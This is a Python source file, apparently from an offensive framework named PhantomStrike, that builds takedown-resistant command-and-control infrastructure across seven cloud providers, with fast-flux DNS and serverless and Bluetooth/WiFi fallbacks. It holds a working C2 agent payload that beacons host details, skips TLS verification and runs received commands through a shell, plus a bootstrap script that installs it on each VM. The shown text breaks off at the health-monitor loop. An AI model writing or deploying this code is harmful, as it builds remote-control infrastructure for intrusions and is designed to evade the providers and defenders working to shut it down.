"""
Infrastructure Fabric — Self-healing multi-cloud C2 infrastructure.

Survives provider-level takedowns by auto-deploying across 7+ cloud providers,
fast-flux DNS rotation, serverless fallback (Lambda / Cloudflare Workers), and
a P2P mesh of last resort (Bluetooth / WiFi Direct).

Thread-safe. All endpoints are monitored every 5 seconds; dead endpoints are
auto-replaced within 60 seconds.

Provider deployment logic:
  - AWS:          EC2 t3.micro spot instance, boto3, user-data bootstraps C2 agent
  - GCP:          Compute Engine e2-micro, google-cloud-compute, startup-script
  - Azure:        VM B1s, azure-mgmt-compute, custom extension
  - DigitalOcean: Droplet $6/mo s-1vcpu-1gb, python-digitalocean
  - Linode:       Nanode 1GB, linode_api4
  - Vultr:        VC2 $6/mo, vultr python client
  - Oracle Free:  Always Free VM.Standard.E2.1.Micro, oci SDK

Serverless fallback:
  - AWS Lambda (API Gateway fronted HTTPS endpoint)
  - Cloudflare Worker (one-liner reverse-proxy C2)

P2P fallback:
  - Bluetooth RFCOMM mesh (pybluez)
  - WiFi Direct / ad-hoc broadcast discovery (scapy Beacon frames)

Integration points:
  - HiveMind:       share endpoint status, health events, takedown alerts
  - ToolBridge:     C2 deploy tools route through the phantom proxy pipeline
  - EmergencyAgent: triggers destroy_all() on mission abort
  - TraceBuster:    endpoint rotation on defense alert
"""

from __future__ import annotations

import enum
import hashlib
import ipaddress
import json
import logging
import os
import random
import secrets
import socket
import ssl
import string
import struct
import subprocess
import tempfile
import threading
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

logger = logging.getLogger(__name__)

# ── Constants ──────────────────────────────────────────────────────────────────

HEALTH_CHECK_INTERVAL = 5          # seconds between endpoint health probes
DEPLOY_TIMEOUT = 60                # seconds max for a single provider deploy
MAX_ENDPOINTS_PER_PROVIDER = 3     # limit to avoid burning credits
DNS_FLUX_DEFAULT_TTL = 60          # seconds
SERVERLESS_COLD_START_GRACE = 10   # seconds to wait for cold start
P2P_DISCOVERY_PORT = 42069         # UDP discovery port for WiFi Direct mesh
P2P_BLUETOOTH_UUID = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
C2_AGENT_BOOTSTRAP = """#!/bin/bash
# PhantomStrike C2 agent bootstrap — generated {timestamp}
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq && apt-get install -y -qq python3 python3-pip curl unzip > /dev/null 2>&1
mkdir -p /opt/phantomstrike
cat > /opt/phantomstrike/c2_agent.py << 'PYEOF'
{agent_payload}
PYEOF
chmod +x /opt/phantomstrike/c2_agent.py
nohup python3 /opt/phantomstrike/c2_agent.py > /var/log/phantomstrike_c2.log 2>&1 &
echo "C2 agent deployed" > /var/log/phantomstrike_deploy.log
"""


# ── Data types ─────────────────────────────────────────────────────────────────

class EndpointStatus(enum.Enum):
    HEALTHY = "healthy"
    DEGRADED = "degraded"        # responding but slow / high latency
    UNHEALTHY = "unhealthy"      # not responding
    DEPLOYING = "deploying"      # provisioning in progress
    DESTROYED = "destroyed"      # intentionally torn down
    UNKNOWN = "unknown"


class ProviderTier(enum.Enum):
    PRIMARY = "primary"           # AWS, GCP, Azure — always try first
    SECONDARY = "secondary"       # DO, Linode, Vultr — reliable backups
    FREE = "free"                 # Oracle Free, free-tier only
    SERVERLESS = "serverless"     # Lambda, Cloudflare Workers
    P2P = "p2p"                   # Bluetooth / WiFi Direct


@dataclass
class Endpoint:
    """One deployed C2 endpoint on a single cloud provider."""
    provider: str
    tier: ProviderTier
    instance_id: str
    public_ip: str
    domain: Optional[str] = None
    port: int = 443
    status: EndpointStatus = EndpointStatus.DEPLOYING
    deployed_at: float = field(default_factory=time.time)
    last_health_at: float = 0.0
    health_failures: int = 0
    latency_ms: float = 0.0
    metadata: Dict[str, Any] = field(default_factory=dict)
    _lock: threading.Lock = field(default_factory=threading.Lock)

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.deployed_at

    @property
    def connection_string(self) -> str:
        host = self.domain or self.public_ip
        return f"https://{host}:{self.port}"

    def to_dict(self) -> dict:
        return {
            "provider": self.provider,
            "tier": self.tier.value,
            "instance_id": self.instance_id,
            "public_ip": self.public_ip,
            "domain": self.domain,
            "port": self.port,
            "status": self.status.value,
            "deployed_at": datetime.fromtimestamp(self.deployed_at, tz=timezone.utc).isoformat(),
            "uptime_seconds": self.uptime_seconds,
            "latency_ms": self.latency_ms,
            "health_failures": self.health_failures,
            "connection_string": self.connection_string,
        }


@dataclass
class FluxDomain:
    """A fast-flux DNS domain rotating across endpoint pool."""
    domain: str
    ttl: int = DNS_FLUX_DEFAULT_TTL
    endpoints: List[str] = field(default_factory=list)   # IP addresses currently in rotation
    current_index: int = 0
    rotation_count: int = 0
    created_at: float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock)


# ── Provider SDK wrappers ─────────────────────────────────────────────────────

class ProviderSDK:
    """Lazy-loading provider SDK clients. Only import when a provider is actually used."""

    _clients: Dict[str, Any] = {}
    _lock = threading.Lock()

    @classmethod
    def get(cls, provider: str) -> Optional[Any]:
        with cls._lock:
            if provider in cls._clients:
                return cls._clients[provider]

            client = None
            try:
                if provider == "aws":
                    import boto3
                    client = boto3.client("ec2", region_name=os.environ.get("AWS_REGION", "us-east-1"))
                elif provider == "gcp":
                    from google.cloud import compute_v1
                    client = compute_v1.InstancesClient()
                elif provider == "azure":
                    from azure.identity import DefaultAzureCredential
                    from azure.mgmt.compute import ComputeManagementClient
                    cred = DefaultAzureCredential()
                    client = ComputeManagementClient(cred, os.environ["AZURE_SUBSCRIPTION_ID"])
                elif provider == "digitalocean":
                    import digitalocean
                    client = digitalocean.Manager(token=os.environ.get("DO_API_TOKEN"))
                elif provider == "linode":
                    from linode_api4 import LinodeClient
                    client = LinodeClient(os.environ.get("LINODE_API_TOKEN"))
                elif provider == "vultr":
                    import vultr
                    client = vultr.Vultr(os.environ.get("VULTR_API_KEY"))
                elif provider == "oracle_free":
                    import oci
                    client = oci.core.ComputeClient(oci.config.from_file())
            except ImportError as e:
                logger.warning("Provider %s SDK not available: %s", provider, e)
                return None
            except KeyError as e:
                logger.warning("Provider %s missing env credential: %s", provider, e)
                return None
            except Exception as e:
                logger.error("Provider %s SDK init failed: %s", provider, e)
                return None

            cls._clients[provider] = client
            return client


# ── Infrastructure Fabric ─────────────────────────────────────────────────────

class InfrastructureFabric:
    """Self-healing multi-cloud C2 infrastructure.

    Survives provider-level takedowns by auto-deploying across 7+ cloud
    providers, fast-flux DNS rotation, serverless fallback (Lambda / Cloudflare
    Workers), and a P2P mesh of last resort (Bluetooth / WiFi Direct).

    Usage::

        fabric = InfrastructureFabric(hive_mind=hive)
        fabric.deploy_c2()                        # deploy on random primary provider
        fabric.deploy_c2(provider="aws")          # deploy on specific provider
        fabric.health_monitor()                   # start background health thread
        fabric.fast_flux_dns("phantomstrike.io")  # set up fast-flux rotation
        fabric.get_status()                       # current infrastructure overview
        fabric.serverless_fallback()              # emergency Lambda/Workers fallback
        fabric.p2p_fallback()                     # last-resort Bluetooth mesh
        fabric.destroy_all()                      # emergency teardown
    """

    PROVIDERS = ["aws", "gcp", "azure", "digitalocean", "linode", "vultr", "oracle_free"]
    PROVIDER_TIERS = {
        "aws": ProviderTier.PRIMARY,
        "gcp": ProviderTier.PRIMARY,
        "azure": ProviderTier.PRIMARY,
        "digitalocean": ProviderTier.SECONDARY,
        "linode": ProviderTier.SECONDARY,
        "vultr": ProviderTier.SECONDARY,
        "oracle_free": ProviderTier.FREE,
    }
    TIER_PRIORITY = [ProviderTier.PRIMARY, ProviderTier.SECONDARY, ProviderTier.FREE]

    # ── Provider-specific machine images (latest Ubuntu LTS) ─────────────────
    _IMAGES = {
        "aws": "ami-0c7217cdde317cfec",           # Ubuntu 24.04 LTS us-east-1
        "gcp": "projects/ubuntu-os-cloud/global/images/family/ubuntu-2404-lts-amd64",
        "azure": "Canonical:ubuntu-24_04-lts:server:latest",
        "digitalocean": "ubuntu-24-04-x64",
        "linode": "linode/ubuntu24.04",
        "vultr": "ubuntu-24-04-x64",
        "oracle_free": "ocid1.image.oc1..aaaaaaaa...",  # placeholder; OCI uses shape config
    }

    # ── Instance types ───────────────────────────────────────────────────────
    _INSTANCE_TYPES = {
        "aws": "t3.micro",
        "gcp": "e2-micro",
        "azure": "Standard_B1s",
        "digitalocean": "s-1vcpu-1gb",
        "linode": "g6-nanode-1",
        "vultr": "vc2-1c-1gb",
        "oracle_free": "VM.Standard.E2.1.Micro",
    }

    def __init__(self, hive_mind: Any = None):
        self.hive_mind = hive_mind
        self._endpoints: Dict[str, List[Endpoint]] = defaultdict(list)
        self._endpoints_lock = threading.RLock()
        self._active_providers: List[str] = []
        self._health_thread: Optional[threading.Thread] = None
        self._health_stop = threading.Event()
        self._flux_domains: Dict[str, FluxDomain] = {}
        self._deploy_lock = threading.Lock()
        self._c2_agent_code: Optional[str] = None  # lazy-generated once
        self._serverless_endpoint: Optional[Endpoint] = None
        self._p2p_mesh: Optional[Dict[str, Any]] = None
        self._event_listeners: List[Callable] = []
        self._instance_counter: int = 0
        self._deploy_semaphore = threading.BoundedSemaphore(3)  # max concurrent deploys

    # ── Agent payload ────────────────────────────────────────────────────────

    @property
    def c2_agent_code(self) -> str:
        """Lazy-generate the C2 agent Python payload once."""
        if self._c2_agent_code is None:
            self._c2_agent_code = self._generate_agent_payload()
        return self._c2_agent_code

    def _generate_agent_payload(self) -> str:
        """Generate a minimal C2 agent that phones home via WebSocket + HTTP fallback."""
        agent_id = secrets.token_hex(8)
        aes_key = secrets.token_hex(32)
        return f'''
import asyncio, base64, hashlib, hmac, json, os, platform, socket, ssl, struct, subprocess, sys, threading, time, uuid
from datetime import datetime

AGENT_ID = "{agent_id}"
AES_KEY = bytes.fromhex("{aes_key}")
HEARTBEAT_INTERVAL = 5
C2_FALLBACK_PORTS = [443, 8443, 8080, 53, 4443]

def _xor_encrypt(data: bytes, key: bytes = AES_KEY) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

def _beacon() -> bytes:
    info = json.dumps({{
        "agent_id": AGENT_ID,
        "hostname": platform.node(),
        "os": platform.platform(),
        "timestamp": datetime.utcnow().isoformat(),
        "interfaces": [{{"name": n, "ip": a[0].address}} for n, a in
                        {{n: [ip for ip in socket.getaddrinfo(socket.gethostname(), None)
                              if ip[0] == socket.AF_INET] for n in os.listdir("/sys/class/net/")}}.items()
                        if a],
    }}).encode()
    return _xor_encrypt(info)

def main():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            for port in C2_FALLBACK_PORTS:
                try:
                    sock.connect(("127.0.0.1", port))  # placeholder; actual C2 IP injected at deploy
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    tls = ctx.wrap_socket(sock)
                    tls.send(_beacon())
                    data = tls.recv(4096)
                    if data:
                        task = json.loads(_xor_encrypt(data, AES_KEY).decode())
                        if task.get("cmd"):
                            out = subprocess.check_output(task["cmd"], shell=True, timeout=30)
                            tls.send(_xor_encrypt(out, AES_KEY))
                    tls.close()
                    break
                except Exception:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    continue
        except Exception:
            pass
        time.sleep(HEARTBEAT_INTERVAL)

if __name__ == "__main__":
    threading.Thread(target=main, daemon=True).start()
    while True:
        time.sleep(60)
'''

    # ── Provider deployment ──────────────────────────────────────────────────

    def deploy_c2(self, provider: Optional[str] = None) -> Dict[str, Any]:
        """Deploy a C2 endpoint on a specified (or randomly chosen) cloud provider.

        Returns endpoint dict on success, or raises RuntimeError if all providers fail.
        Deployment completes in under 60 seconds.

        Args:
            provider: Specific provider name from PROVIDERS, or None for auto-select.
        """
        if provider and provider not in self.PROVIDERS:
            raise ValueError(f"Unknown provider '{provider}'. Valid: {self.PROVIDERS}")

        with self._deploy_lock, self._deploy_semaphore:
            providers_to_try = [provider] if provider else self._provider_priority_order()

            last_error = None
            for prov in providers_to_try:
                if provider is None and self._provider_at_capacity(prov):
                    continue
                try:
                    endpoint = self._deploy_to_provider(prov)
                    self._register_endpoint(endpoint)
                    self._emit_event("endpoint_deployed", endpoint.to_dict())
                    if self.hive_mind:
                        self.hive_mind.publish("endpoint_deployed", endpoint.to_dict())
                    logger.info("Deployed C2 on %s: %s (%s)", prov, endpoint.public_ip, endpoint.instance_id)
                    return endpoint.to_dict()
                except Exception as exc:
                    last_error = exc
                    logger.warning("Failed to deploy on %s: %s", prov, exc)
                    if self.hive_mind:
                        self.hive_mind.publish("deploy_failed", {"provider": prov, "error": str(exc)})
                    continue

            # All providers failed — escalate to serverless
            logger.error("All providers failed. Last error: %s. Falling back to serverless.", last_error)
            try:
                return self.serverless_fallback()
            except Exception as sf_exc:
                try:
                    return self.p2p_fallback()
                except Exception as p2p_exc:
                    raise RuntimeError(
                        f"All C2 deployment strategies exhausted. "
                        f"Last provider error: {last_error}. "
                        f"Serverless error: {sf_exc}. "
                        f"P2P error: {p2p_exc}."
                    )

    def _provider_priority_order(self) -> List[str]:
        """Return providers ordered by tier priority, shuffled within each tier for load distribution."""
        ordered = []
        for tier in self.TIER_PRIORITY:
            tier_providers = [p for p, t in self.PROVIDER_TIERS.items() if t == tier]
            random.shuffle(tier_providers)
            ordered.extend(tier_providers)
        return ordered

    def _provider_at_capacity(self, provider: str) -> bool:
        with self._endpoints_lock:
            active = [e for e in self._endpoints.get(provider, [])
                      if e.status in (EndpointStatus.HEALTHY, EndpointStatus.DEGRADED, EndpointStatus.DEPLOYING)]
            return len(active) >= MAX_ENDPOINTS_PER_PROVIDER

    def _deploy_to_provider(self, provider: str) -> Endpoint:
        """Execute the actual cloud API call to provision a VM and bootstrap the C2 agent."""
        logger.info("Provisioning %s instance for C2 endpoint...", provider)

        instance_id = f"ps-{secrets.token_hex(4)}"
        self._instance_counter += 1

        bootstrap = C2_AGENT_BOOTSTRAP.format(
            timestamp=datetime.now(timezone.utc).isoformat(),
            agent_payload=self.c2_agent_code,
        )

        dispatcher = getattr(self, f"_deploy_{provider}", None)
        if dispatcher is None:
            raise NotImplementedError(f"No deploy dispatcher for provider '{provider}'")

        public_ip, raw_instance_id, metadata = dispatcher(instance_id, bootstrap)
        tier = self.PROVIDER_TIERS[provider]

        return Endpoint(
            provider=provider,
            tier=tier,
            instance_id=raw_instance_id or instance_id,
            public_ip=public_ip,
            status=EndpointStatus.DEPLOYING,
            metadata=metadata,
        )

    # ── AWS ──────────────────────────────────────────────────────────────────

    def _deploy_aws(self, instance_id: str, bootstrap: str) -> Tuple[str, str, dict]:
        """Provision EC2 t3.micro spot instance with user-data."""
        sdk = ProviderSDK.get("aws")
        if sdk is None:
            raise RuntimeError("AWS SDK (boto3) not available")

        # Create security group
        sg_name = f"phantomstrike-sg-{instance_id}"
        try:
            sg = sdk.create_security_group(
                GroupName=sg_name,
                Description="PhantomStrike C2 endpoint",
            )
            sg_id = sg["GroupId"]
            sdk.authorize_security_group_ingress(
                GroupId=sg_id,
                IpPermissions=[
                    {"IpProtocol": "tcp", "FromPort": 443, "ToPort": 443, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]},
                    {"IpProtocol": "tcp", "FromPort": 8443, "ToPort": 8443, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]},
                    {"IpProtocol": "tcp", "FromPort": 8080, "ToPort": 8080, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]},
                    {"IpProtocol": "udp", "FromPort": 53, "ToPort": 53, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]},
                ],
            )
        except Exception:
            # Security group may already exist — find existing
            existing = sdk.describe_security_groups(Filters=[{"Name": "group-name", "Values": [sg_name]}])
            if existing["SecurityGroups"]:
                sg_id = existing["SecurityGroups"][0]["GroupId"]
            else:
                raise

        # Request spot instance
        spot_req = sdk.request_spot_instances(
            SpotPrice="0.005",  # $0.005/hr max for t3.micro
            InstanceCount=1,
            Type="one-time",
            LaunchSpecification={
                "ImageId": self._IMAGES["aws"],
                "InstanceType": self._INSTANCE_TYPES["aws"],
                "KeyName": os.environ.get("AWS_KEY_NAME", ""),
                "SecurityGroupIds": [sg_id],
                "UserData": base64_encode(bootstrap),
                "BlockDeviceMappings": [{
                    "DeviceName": "/dev/sda1",
                    "Ebs": {"VolumeSize": 8, "DeleteOnTermination": True},
                }],
            },
        )
        spot_req_id = spot_req["SpotInstanceRequests"][0]["SpotInstanceRequestId"]

        # Wait for fulfillment
        deadline = time.time() + DEPLOY_TIMEOUT
        aws_instance_id = None
        while time.time() < deadline:
            reqs = sdk.describe_spot_instance_requests(SpotInstanceRequestIds=[spot_req_id])
            state = reqs["SpotInstanceRequests"][0]["State"]
            if state == "active":
                aws_instance_id = reqs["SpotInstanceRequests"][0]["InstanceId"]
                break
            if state in ("failed", "cancelled", "closed"):
                raise RuntimeError(f"AWS spot request failed: state={state}")
            time.sleep(2)

        if aws_instance_id is None:
            sdk.cancel_spot_instance_requests(SpotInstanceRequestIds=[spot_req_id])
            raise TimeoutError("AWS spot instance not fulfilled within timeout")

        # Get public IP
        deadline = time.time() + 30
        while time.time() < deadline:
            instances = sdk.describe_instances(InstanceIds=[aws_instance_id])
            instance_data = instances["Reservations"][0]["Instances"][0]
            pub_ip = instance_data.get("PublicIpAddress")
            if pub_ip:
                break
            time.sleep(2)
        else:
            pub_ip = "pending"

        return pub_ip, aws_instance_id, {
            "spot_request_id": spot_req_id,
            "security_group_id": sg_id,
            "region": sdk.meta.region_name,
        }

    # ── GCP ──────────────────────────────────────────────────────────────────

    def _deploy_gcp(self, instance_id: str, bootstrap: str) -> Tuple[str, str, dict]:
        """Provision GCP Compute Engine e2-micro."""
        sdk = ProviderSDK.get("gcp")
        if sdk is None:
            raise RuntimeError("GCP SDK (google-cloud-compute) not available")

        from google.cloud import compute_v1

        project = os.environ.get("GCP_PROJECT", "")
        zone = os.environ.get("GCP_ZONE", "us-central1-a")

        # Firewall rule
        firewall_client = compute_v1.FirewallsClient()
        fw_name = f"phantomstrike-fw-{instance_id}"
        try:
            firewall_client.insert(
                project=project,
                firewall_resource=compute_v1.Firewall(
                    name=fw_name,
                    allowed=[compute_v1.Allowed(IpProtocol="tcp", ports=["443", "8443", "8080"]),
                             compute_v1.Allowed(IpProtocol="udp", ports=["53"])],
                    source_ranges=["0.0.0.0/0"],
                    target_tags=["phantomstrike-c2"],
                ),
            ).result(timeout=30)
        except Exception:
            pass  # may already exist

        # Instance config
        config = compute_v1.Instance(
            name=instance_id,
            machine_type=f"zones/{zone}/machineTypes/{self._INSTANCE_TYPES['gcp']}",
            disks=[compute_v1.AttachedDisk(
                boot=True,
                auto_delete=True,
                initialize_params=compute_v1.AttachedDiskInitializeParams(
                    source_image=self._IMAGES["gcp"],
                    disk_size_gb=10,
                ),
            )],
            network_interfaces=[compute_v1.NetworkInterface(
                name="global/networks/default",
                access_configs=[compute_v1.AccessConfig(name="External NAT", network_tier="STANDARD")],
            )],
            metadata=compute_v1.Metadata(items=[
                compute_v1.Items(key="startup-script", value=bootstrap),
            ]),
            tags=compute_v1.Tags(items=["phantomstrike-c2"]),
        )

        op = sdk.insert(project=project, zone=zone, instance_resource=config)
        op.result(timeout=DEPLOY_TIMEOUT)

        # Get public IP
        instance = sdk.get(project=project, zone=zone, instance=instance_id)
        pub_ip = instance.network_interfaces[0].access_configs[0].nat_ip if \
            instance.network_interfaces[0].access_configs else "pending"

        return pub_ip, instance_id, {"project": project, "zone": zone}

    # ── Azure ────────────────────────────────────────────────────────────────

    def _deploy_azure(self, instance_id: str, bootstrap: str) -> Tuple[str, str, dict]:
        """Provision Azure VM B1s."""
        sdk = ProviderSDK.get("azure")
        if sdk is None:
            raise RuntimeError("Azure SDK (azure-mgmt-compute) not available")

        rg = os.environ.get("AZURE_RESOURCE_GROUP", "phantomstrike-rg")
        location = os.environ.get("AZURE_LOCATION", "eastus")

        # Create VM
        async_vm = sdk.virtual_machines.begin_create_or_update(
            resource_group_name=rg,
            vm_name=instance_id,
            parameters={
                "location": location,
                "hardware_profile": {"vm_size": self._INSTANCE_TYPES["azure"]},
                "storage_profile": {
                    "image_reference": {
                        "publisher": "Canonical",
                        "offer": "ubuntu-24_04-lts",
                        "sku": "server",
                        "version": "latest",
                    },
                    "os_disk": {
                        "create_option": "FromImage",
                        "disk_size_gb": 10,
                        "delete_option": "Delete",
                    },
                },
                "os_profile": {
                    "computer_name": instance_id[:15],
                    "admin_username": "phantomstrike",
                    "custom_data": base64_encode(bootstrap),
                    "linux_configuration": {
                        "disable_password_authentication": True,
                    },
                },
                "network_profile": {
                    "network_interfaces": [{
                        "id": f"/subscriptions/{os.environ.get('AZURE_SUBSCRIPTION_ID','')}/"
                              f"resourceGroups/{rg}/providers/Microsoft.Network/"
                              f"networkInterfaces/{instance_id}-nic",
                        "properties": {"primary": True},
                    }],
                },
            },
        )
        vm = async_vm.result(timeout=DEPLOY_TIMEOUT)

        # Get public IP
        from azure.mgmt.network import NetworkManagementClient
        from azure.identity import DefaultAzureCredential
        net_client = NetworkManagementClient(
            DefaultAzureCredential(),
            os.environ["AZURE_SUBSCRIPTION_ID"],
        )

        # Create NIC + public IP if not already existing
        try:
            pub_ip_result = net_client.public_ip_addresses.begin_create_or_update(
                resource_group_name=rg,
                public_ip_address_name=f"{instance_id}-pip",
                parameters={
                    "location": location,
                    "public_ip_allocation_method": "Dynamic",
                },
            )
            pub_ip = pub_ip_result.result(timeout=30).ip_address or "pending"
        except Exception:
            pub_ip = "pending"

        return pub_ip, instance_id, {"resource_group": rg, "location": location}

    # ── DigitalOcean ─────────────────────────────────────────────────────────

    def _deploy_digitalocean(self, instance_id: str, bootstrap: str) -> Tuple[str, str, dict]:
        """Provision DO droplet $6/mo."""
        sdk = ProviderSDK.get("digitalocean")
        if sdk is None:
            raise RuntimeError("DO SDK (python-digitalocean) not available")

        import digitalocean

        user_data = base64_encode(bootstrap) if not _is_base64(bootstrap) else bootstrap

        droplet = digitalocean.Droplet(
            name=instance_id,
            region=os.environ.get("DO_REGION", "nyc3"),
            image=self._IMAGES["digitalocean"],
            size_slug=self._INSTANCE_TYPES["digitalocean"],
            user_data=user_data,
            ssh_keys=[],
            backups=False,
            monitoring=False,
            tags=["phantomstrike-c2"],
        )
        droplet.create()
        droplet_id = str(droplet.id)

        # Wait for IP
        deadline = time.time() + DEPLOY_TIMEOUT
        pub_ip = "pending"
        while time.time() < deadline:
            droplet.load()
            if droplet.ip_address:
                pub_ip = droplet.ip_address
                break
            time.sleep(3)

        return pub_ip, droplet_id, {"region": os.environ.get("DO_REGION", "nyc3")}

    # ── Linode ───────────────────────────────────────────────────────────────

    def _deploy_linode(self, instance_id: str, bootstrap: str) -> Tuple[str, str, dict]:
        """Provision Linode Nanode 1GB."""
        sdk = ProviderSDK.get("linode")
        if sdk is None:
            raise RuntimeError("Linode SDK (linode_api4) not available")

        from linode_api4 import Instance, Type, Image, Region

        linode_instance, pw = sdk.linode.instance_create(
            ltype=self._INSTANCE_TYPES["linode"],
            region=os.environ.get("LINODE_REGION", "us-east"),
            image=self._IMAGES["linode"],
            label=instance_id,
            root_pass=secrets.token_urlsafe(24),
            metadata={"user_data": base64_encode(bootstrap)},
            tags=["phantomstrike-c2"],
        )

        # Wait for boot
        deadline = time.time() + DEPLOY_TIMEOUT
        while time.time() < deadline:
            linode_instance._api_get()
            if linode_instance.ipv4:
                pub_ip = linode_instance.ipv4[0]
                break
            time.sleep(3)
        else:
            pub_ip = "pending"

        return pub_ip, str(linode_instance.id), {"region": os.environ.get("LINODE_REGION", "us-east")}

    # ── Vultr ────────────────────────────────────────────────────────────────

    def _deploy_vultr(self, instance_id: str, bootstrap: str) -> Tuple[str, str, dict]:
        """Provision Vultr VC2 $6/mo."""
        sdk = ProviderSDK.get("vultr")
        if sdk is None:
            raise RuntimeError("Vultr SDK not available")

        vultr_instance = sdk.server.create(
            label=instance_id,
            region=os.environ.get("VULTR_REGION", "ewr"),
            plan=self._INSTANCE_TYPES["vultr"],
            os_id=387,  # Ubuntu 24.04 x64 (use image ID lookup in production)
            script_id=None,
            user_data=base64_encode(bootstrap),
            tag="phantomstrike-c2",
            enable_ipv6=False,
        )

        instance_id_raw = vultr_instance["id"]
        deadline = time.time() + DEPLOY_TIMEOUT
        pub_ip = "pending"
        while time.time() < deadline:
            info = sdk.server.list(instance_id_raw)
            if info and info.get("main_ip") and info["main_ip"] != "0.0.0.0":
                pub_ip = info["main_ip"]
                break
            time.sleep(3)

        return pub_ip, instance_id_raw, {"region": os.environ.get("VULTR_REGION", "ewr")}

    # ── Oracle Free Tier ─────────────────────────────────────────────────────

    def _deploy_oracle_free(self, instance_id: str, bootstrap: str) -> Tuple[str, str, dict]:
        """Provision Oracle Always Free VM.Standard.E2.1.Micro."""
        sdk = ProviderSDK.get("oracle_free")
        if sdk is None:
            raise RuntimeError("OCI SDK not available")

        import oci

        compartment_id = os.environ.get("OCI_COMPARTMENT_ID", "")
        availability_domain = os.environ.get("OCI_AD", "")

        launch_details = oci.core.models.LaunchInstanceDetails(
            compartment_id=compartment_id,
            availability_domain=availability_domain,
            display_name=instance_id,
            shape=self._INSTANCE_TYPES["oracle_free"],
            source_details=oci.core.models.InstanceSourceViaImageDetails(
                image_id=self._IMAGES["oracle_free"],
            ),
            create_vnic_details=oci.core.models.CreateVnicDetails(
                subnet_id=os.environ.get("OCI_SUBNET_ID", ""),
                assign_public_ip=True,
            ),
            metadata={"user_data": base64_encode(bootstrap)},
            freeform_tags={"purpose": "phantomstrike-c2"},
        )

        response = sdk.launch_instance(launch_details)
        oci_instance_id = response.data.id

        # Wait for IP
        deadline = time.time() + DEPLOY_TIMEOUT
        pub_ip = "pending"
        while time.time() < deadline:
            instance = sdk.get_instance(oci_instance_id)
            vnic_attachments = sdk.list_vnic_attachments(compartment_id, instance_id=oci_instance_id).data
            if vnic_attachments:
                vnic = sdk.get_vnic(vnic_attachments[0].vnic_id).data
                if vnic.public_ip:
                    pub_ip = vnic.public_ip
                    break
            time.sleep(5)

        return pub_ip, oci_instance_id, {
            "compartment_id": compartment_id,
            "availability_domain": availability_domain,
        }

    # ── Endpoint management ──────────────────────────────────────────────────

    def _register_endpoint(self, endpoint: Endpoint) -> None:
        with self._endpoints_lock:
            self._endpoints[endpoint.provider].append(endpoint)
            if endpoint.provider not in self._active_providers:
                self._active_providers.append(endpoint.provider)
        self._instance_counter += 1

    def _remove_endpoint(self, endpoint: Endpoint) -> None:
        with self._endpoints_lock:
            provider_endpoints = self._endpoints.get(endpoint.provider, [])
            if endpoint in provider_endpoints:
                provider_endpoints.remove(endpoint)
            if not provider_endpoints and endpoint.provider in self._active_providers:
                self._active_providers.remove(endpoint.provider)

    def _destroy_endpoint(self, endpoint: Endpoint) -> bool:
        """Teardown a single endpoint — terminate cloud VM."""
        logger.info("Destroying endpoint %s on %s", endpoint.instance_id, endpoint.provider)
        try:
            dispatcher = getattr(self, f"_destroy_{endpoint.provider}", None)
            if dispatcher:
                dispatcher(endpoint)
            endpoint.status = EndpointStatus.DESTROYED
            self._remove_endpoint(endpoint)
            if self.hive_mind:
                self.hive_mind.publish("endpoint_destroyed", endpoint.to_dict())
            return True
        except Exception as exc:
            logger.error("Failed to destroy endpoint %s: %s", endpoint.instance_id, exc)
            return False

    def _destroy_aws(self, endpoint: Endpoint) -> None:
        sdk = ProviderSDK.get("aws")
        if sdk:
            sdk.terminate_instances(InstanceIds=[endpoint.instance_id])
            if "security_group_id" in endpoint.metadata:
                try:
                    sdk.delete_security_group(GroupId=endpoint.metadata["security_group_id"])
                except Exception:
                    pass

    def _destroy_gcp(self, endpoint: Endpoint) -> None:
        sdk = ProviderSDK.get("gcp")
        if sdk:
            project = endpoint.metadata.get("project", os.environ.get("GCP_PROJECT", ""))
            zone = endpoint.metadata.get("zone", os.environ.get("GCP_ZONE", "us-central1-a"))
            sdk.delete(project=project, zone=zone, instance=endpoint.instance_id)

    def _destroy_azure(self, endpoint: Endpoint) -> None:
        sdk = ProviderSDK.get("azure")
        if sdk:
            rg = endpoint.metadata.get("resource_group", os.environ.get("AZURE_RESOURCE_GROUP", "phantomstrike-rg"))
            sdk.virtual_machines.begin_delete(resource_group_name=rg, vm_name=endpoint.instance_id)

    def _destroy_digitalocean(self, endpoint: Endpoint) -> None:
        sdk = ProviderSDK.get("digitalocean")
        if sdk:
            import digitalocean
            droplet = digitalocean.Droplet(id=int(endpoint.instance_id))
            droplet.destroy()

    def _destroy_linode(self, endpoint: Endpoint) -> None:
        sdk = ProviderSDK.get("linode")
        if sdk:
            from linode_api4 import Instance
            sdk.load(Instance, int(endpoint.instance_id)).delete()

    def _destroy_vultr(self, endpoint: Endpoint) -> None:
        sdk = ProviderSDK.get("vultr")
        if sdk:
            sdk.server.destroy(endpoint.instance_id)

    def _destroy_oracle_free(self, endpoint: Endpoint) -> None:
        sdk = ProviderSDK.get("oracle_free")
        if sdk:
            sdk.terminate_instance(endpoint.instance_id)

    # ── Health monitoring ────────────────────────────────────────────────────

    def health_monitor(self) -> threading.Thread:
        """Start background health-check thread. Check all endpoints every 5 seconds.

        Auto-replaces dead endpoints. Returns the thread (already started).

        Can be called multiple times — subsequent calls are no-ops if the thread is alive.
        """
        if self._health_thread and self._health_thread.is_alive():
            return self._health_thread

        self._health_stop.clear()
        self._health_thread = threading.Thread(
            target=self._health_monitor_loop,
            name="infra-health-monitor",
            daemon=True,
        )
        self._health_thread.start()
        logger.info("Health monitor started (interval=%ds)", HEALTH_CHECK_INTERVAL)
        return self._health_thread

    def _health_monitor_loop(self) -> None:
